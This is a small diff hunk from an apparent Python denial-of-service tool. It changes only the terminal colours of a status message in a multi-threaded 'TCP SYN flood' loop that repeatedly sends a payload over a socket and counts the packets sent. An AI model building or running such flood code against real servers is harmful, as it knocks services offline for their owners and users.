@@ -144,7 +144,7 @@ def tcp_data_flood_multi(ip, port, duration, packet_size):
             while time.time() < end_time:
                 time.sleep(0.2)
                 print("\033[48;5;6mStarting TCP SYN flood Multi-threads \033[0m \033[97m" +str(ip)+ " \033[33m0k..!")
-                print("\033[91m Starting TCP SYN flood Multi-threads \033[32m" +str(packet_count)+ " \033[94mnumb-attack\033[0m")
+                print("\033[36m Starting TCP SYN flood Multi-threads \033[91m" +str(packet_count)+ " \033[94mnumb-attack\033[0m")
                 sock.send(payload)
                 packet_count[0] += 1
         except:
